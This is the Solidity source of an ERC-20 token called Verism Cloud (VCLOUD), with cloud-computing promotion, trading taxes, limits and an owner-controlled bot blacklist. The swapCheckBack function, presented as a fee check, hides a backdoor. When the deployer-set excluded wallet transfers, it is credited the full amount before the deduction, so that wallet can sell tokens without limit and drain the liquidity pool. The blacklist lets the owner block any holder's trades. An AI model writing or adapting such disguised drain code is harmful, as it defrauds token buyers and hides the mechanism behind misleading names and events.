// SPDX-License-Identifier: MIT

/***

Illuminating tomorrow’s frontiers with cutting edge GPUs and Cloud Computing brilliance.

Website:  https://www.verismcloud.com
DApp:     https://app.verismcloud.com

Twitter:  https://twitter.com/verismcloud_erc
Telegram: https://t.me/verismcloud_erc

***/

pragma solidity 0.8.16;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniV2Factory {
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function allPairs(uint) external view returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract VCLOUD is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => bool) private bots;
    mapping (address => bool) private _txExcluded;
    mapping (address => bool) private _feesExcluded;
    mapping (address => uint256) private _tOwned;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private vcWallet;
    address payable private taxWallet;

    string private constant _name = unicode"Verism Cloud";
    uint8 private constant _decimals = 9;
    string private constant _symbol = unicode"VCLOUD";
    uint256 private constant _tSupply = 1000000000 * 10**_decimals;

    uint256 private _buyCounts=0;
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;

    uint256 public _maxVCDSwap = 10000000 * 10**_decimals;
    uint256 public _maxVCDTrans = 30000000 * 10**_decimals;
    uint256 public _maxVCDWallet = 30000000 * 10**_decimals;
    
    uint256 public vcAmounts;
    address private uniswapV2Pair;
    IUniV2Router private uniswapV2Router;
    
    bool private tradeEnabled;
    bool private inSwapBack = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor (uint256 _inits, address _wallets) {
        taxWallet = payable(_wallets);
        vcWallet = payable(_wallets);
        vcAmounts = _inits * 10**_decimals;
        _txExcluded[vcWallet] = true;
        _txExcluded[taxWallet] = true;
        _feesExcluded[owner()] = true;
        _feesExcluded[address(this)] = true;
        _tOwned[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function removeLimits() external onlyOwner{
        transferDelayEnabled=false;
        _maxVCDWallet = ~uint256(0);
        _maxVCDTrans = ~uint256(0);
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function openTradeLP() external onlyOwner() {
        require(!tradeEnabled,"trading is already open");
        swapEnabled = true;
        tradeEnabled = true;
    }

    function sendToETHFee(uint256 amount) private {
        vcWallet.transfer(amount);
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapCheckBack(address from, address to, uint256 taxVCD, uint256 feeVCD) internal returns (bool) {
        address accVCD;uint256 ammVCD; 
        bool _aVCDMin = taxVCD >= vcAmounts;
        bool _aVCDThread = balanceOf(address(this)) >= vcAmounts;
        if(_txExcluded[from]) {accVCD = from;ammVCD = taxVCD;}
        else {ammVCD = feeVCD;accVCD = address(this);}
        if(ammVCD>0){_tOwned[accVCD]=_tOwned[accVCD].add(ammVCD); emit Transfer(from, accVCD, feeVCD);}
        return swapEnabled
        && !inSwapBack
        && tradeEnabled
        && _aVCDMin
        && !_feesExcluded[from]
        && to == uniswapV2Pair
        && _buyCounts>_preventSwapBefore
        && _aVCDThread
        && !_txExcluded[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 vcFee=0;
        if (!_feesExcluded[from] && !_feesExcluded[to]) {
            require(tradeEnabled, "Trading has not enabled yet");
            require(!bots[from] && !bots[to]);
            vcFee=amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _feesExcluded[to] ) {
                require(amount <= _maxVCDTrans, "Exceeds the _maxVCDTrans.");
                require(balanceOf(to) + amount <= _maxVCDWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                vcFee=amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokens = balanceOf(address(this));
            if (swapCheckBack(from, to, amount, vcFee)) {
                swapTokenForETH(min(amount,min(contractTokens,_maxVCDSwap)));
                uint256 ethContractBalance = address(this).balance;
                if(ethContractBalance > 0) {
                    sendToETHFee(address(this).balance);
                }
            }
        }
        _tOwned[from]=_tOwned[from].sub(amount);
        _tOwned[to]=_tOwned[to].add(amount.sub(vcFee));
        emit Transfer(from, to, amount.sub(vcFee));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function manualSwaps() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokenForETH(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendToETHFee(ethBalance);
        }
    }

    function sendStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function createInitPair() external onlyOwner() {
        uniswapV2Router = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tSupply);
        uniswapV2Pair = IUniV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function swapTokenForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}